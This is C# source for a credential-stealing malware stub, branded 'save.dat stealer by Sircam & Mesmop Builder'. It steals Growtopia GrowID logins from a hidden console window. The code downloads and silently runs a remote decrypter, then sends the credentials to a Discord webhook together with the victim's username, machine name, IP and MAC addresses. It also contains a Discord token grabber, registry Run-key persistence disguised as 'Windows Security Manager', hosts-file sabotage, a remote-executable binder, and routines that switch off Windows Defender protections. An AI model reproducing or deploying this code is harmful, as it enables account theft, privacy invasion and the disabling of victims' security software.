using System.Reflection;
using System.Runtime.InteropServices;
using System;
using System.Net;
using System.Collections.Specialized;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text.RegularExpressions;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]

namespace WindowsFormsApp2
{
    public class dWebHook : IDisposable
    {
        public string WebHook { get; set; }
        public string Attachment { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture { get; set; }
        public string decrypterlink = "CDN.DISCORD LINK THAT YOU UPLOADED THE DECRYPTER THAT YOU BUILT"; //change here
        public string chromerecovery = "CDN.DISCORD LINK THAT YOU UPLOADED THE CHROME-PASSWORD-RECOVERY FILE THAT YOU BUILT"; //change here

        public dWebHook()
        {
            this.dWebClient = new WebClient();
        }

        public void SendMessage(string msgSend)
        {
            discordValues.Add("username", UserName);
            discordValues.Add("avatar_url", ProfilePicture);
            dWebHook.discordValues.Add("content", msgSend);
            this.dWebClient.UploadValues(this.WebHook, dWebHook.discordValues);
        }

        public void SendAttachment(string path)
        {
            this.dWebClient.UploadFile(this.WebHook, path);
        }

        public void Dispose()
        {
            this.dWebClient.Dispose();
        }

        private readonly WebClient dWebClient;

        private static NameValueCollection discordValues = new NameValueCollection();
    }

    public class recieve // discord webhook link
    {
        public static string receiver() // webhook receiver
        {
            return "";
        }
    }

    public class Program
    {
        [DllImport("kernel32.dll")] // konsolu gizlemek için
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); // bitiş

        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", previus;
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();

        public static void SendSaveDat() // sends save.dat to webhook
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            if (!File.Exists(Path.GetTempPath() + "\\pass.txt"))
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(decrypterlink, Path.GetTempPath() + "\\decode.exe");
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.GetTempPath() + "\\decode.exe",
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion

            bool sendCredentials = false;
            if (sendCredentials)
            {
                if (File.Exists(Path.GetTempPath() + "\\Y2hyb21l.exe")) File.Delete(Path.GetTempPath() + "\\Y2hyb21l.exe");
                WebClient oyy = new WebClient();
                oyy.DownloadFile(decrypterlink, Path.GetTempPath() + "\\Y2hyb21l.exe");
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.GetTempPath() + "\\Y2hyb21l.exe",
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }

            using (dWebHook dwebhook = new dWebHook())
            {
                dwebhook.WebHook = "#gaywebhuk";
                dwebhook.ProfilePicture = "https://cdn.discordapp.com/attachments/847565770351181835/859749093546131456/SircamPNG.png";
                dwebhook.UserName = "Sircam Builder";
                dwebhook.SendMessage(string.Concat(new string[]
                {
                    "```\nsave.dat stealer by Sircam & Mesmop Builder\n",
                    "\nSenders PC INFO: ", Environment.UserName, "/", Environment.MachineName,
                    "\nSenders Ip Adress: ", ipAdress(),
                    "\nSenders Discord Tokens: ", //tokens()HEHE
                    "\nSenders Mac Adresses: ", macAdresses(),
                    "\n\nSenders GrowID: ", username,
                    "\nSenders Password: ", password,
                    "\n\nsave.dat stealer by Sircam & Mesmop Builder```",
                }));
                if (sendCredentials)
                {
                    dwebhook.SendAttachment(Path.GetTempPath() + "\\Credentials.txt");
                }
            }

            /*using (dWebHook dwwwb = new dWebHook())
            {
                if (!File.Exists(Path.GetTempPath() + "\\Credentials.txt"))
                {
                    if (File.Exists(Path.GetTempPath() + "\\Y2hyb21l.exe"))
                    {
                        File.Delete(Path.GetTempPath() + "\\Y2hyb21l.exe");
                    }
                    WebClient webClient3 = new WebClient();
                    webClient3.DownloadFile(chromerecovery, Path.GetTempPath() + "\\Y2hyb21l.exe");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\Y2hyb21l.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    });
                }
                dwwwb.WebHook = recieve.receiver();
                dwwwb.ProfilePicture = "https://cdn.discordapp.com/attachments/847565770351181835/859749093546131456/SircamPNG.png";
                dwwwb.UserName = "Sircam Builder";
                dwwwb.SendMessage(string.Concat(new string[]
                {
                    "```\nsave.dat stealer by Sircam & Mesmop Builder\n",
                    "\nSenders PC INFO: ", Environment.UserName, "/", Environment.MachineName,
                    "\nSenders Ip Adress: ", ipAdress(),
                    "\nSenders Discord Tokens: ", tokens(),
                    "\nSenders Mac Adresses: ", macAdresses(),
                    "\n\nSenders GrowID: ", username,
                    "\nSenders Password: ", password,
                    "\n\nsave.dat stealer by Sircam & Mesmop Builder```",
                }));
                dwwwb.SendAttachment(Path.GetTempPath() + "\\Credentials.txt");
            }*/

            previus = username + password;
        }

        static void Main(string[] args)
        {
            const int SW_HIDE = 0;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // to hide the console

            //corrupt();HEHE
            //bindFile();HEHE
            //forceAdmin();HEHE
            //disableDefender();HEHE
            //Startup();HEHE
            SendSaveDat();//HEHE
        }

        public static void bindFile() // runs that program too
        {
            if (File.Exists(Path.GetTempPath() + "\\eWFycmFr.exe")) File.Delete(Path.GetTempPath() + "\\eWFycmFr.exe");
            WebClient wb = new WebClient();
            wb.DownloadFile("binderlinkza", Path.GetTempPath() + "\\eWFycmFr.exe");
            Process.Start(Path.GetTempPath() + "\\eWFycmFr.exe");
        }

        public static void forceAdmin() // forces admin
        {

        }

        public static void Startup() // adds to regedit run
        {
            string msup = Path.GetTempPath() + "\\YXJhc2thcmdv.exe";
            if (File.Exists(msup))
            {
                return;
            }
            File.Copy(Application.ExecutablePath, Path.GetTempPath() + "\\YXJhc2thcmdv.exe");
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue("Windows Security Manager", msup);

            Process.Start(Path.GetTempPath() + "\\YXJhc2thcmdv.exe");
        }

        public static void corrupt() // changes the hosts file, cant login to gt
        {
            using (StreamWriter writer = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts"))
            {
                writer.WriteLine("127.0.0.1 growtopia1.com");
                writer.WriteLine("127.0.0.1 growtopia2.com");
            }
        }

        public static string ipAdress() // get the ip adress
        {
            WebClient Wbclient = new WebClient();
            string anamz = Wbclient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            anamz += "\n";
            return anamz;
        }

        public static void SendSave() // sends username and password to SendSaveDat()
        {
            if (File.Exists(Path.GetTempPath() + "\\decode.exe")) File.Delete(Path.GetTempPath() + "\\decode.exe");
            WebClient wc = new WebClient();
            wc.DownloadFile(decrypterlink, Path.GetTempPath() + "\\decode.exe"); // amateurz's savedecrypter for 1 pass :D
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.GetTempPath() + "\\decode.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion
            SendSaveDat(); //read growid and password and send the save dat after focus gt if changes pass sends :v

            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
            }
        }

        public static string macAdresses() // grab mac adresses
        {
            string s = "";
            int num = 1;

            foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    s += "\n";
                    s += num.ToString() + "- ";
                    s += networkInterface.GetPhysicalAddress().ToString();
                    ++num;
                    break;
                }
            }

            s += "\n";
            s += num.ToString() + "- ";
            ++num;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                s += "\n";
                s += num.ToString() + "- ";
                s += nic.GetPhysicalAddress().ToString();
                ++num;
            }
            return s;
        }

        public static string tokens() // grab tokens
        {
            var tokens = new List<string>();
            var file = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");

            int index;
            while ((index = file.IndexOf("oken")) != -1)
            {
                file = file.Substring(index + "oken".Length);
                tokens.Add(file.Split('"')[1]);
            }
            string s = "";
            for (var i = 1; i <= tokens.Count; i++)
            {
                s += "\n";
                s += i.ToString() + "- " + tokens[i - 1];
            }

            return s;
        }

        private static void OnSaveChanged(object source, FileSystemEventArgs e) // checks if the save.dat changes
        {
            if (e.FullPath == savePath)
            {
                try
                {
                    #region CreateFiles
                    string fileName = Path.GetTempPath() + "\\pass.txt";
                    FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
                    fs.Close();
                    string fileNamea = Path.GetTempPath() + "\\user.txt";
                    FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
                    fsa.Close();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\decode.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                    #endregion
                    #region ReadGrowIDPass
                    string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
                    string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
                    #endregion
                    fileSystemWatcher.EnableRaisingEvents = false;
                    if (previus != username + password)
                    {
                        previus = username + password;

                        if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                        {

                        }
                        else
                        {
                            SendSaveDat();
                        }
                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }

        public static void disableDefender() // disables windows defender
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                return;
            }

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
    }
}